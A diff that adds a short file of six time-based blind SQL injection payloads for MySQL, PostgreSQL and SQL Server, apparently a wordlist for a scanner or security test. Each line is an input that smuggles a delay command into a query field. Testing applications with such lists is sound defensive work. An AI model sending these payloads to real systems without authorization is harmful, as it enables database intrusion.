@@ -1,0 +1,6 @@
+1 AND SLEEP(5)
+' AND SLEEP(5)--
+1;SELECT SLEEP(5)
+1 AND pg_sleep(5)
+' AND pg_sleep(5)--
+1 WAITFOR DELAY '0:0:5'
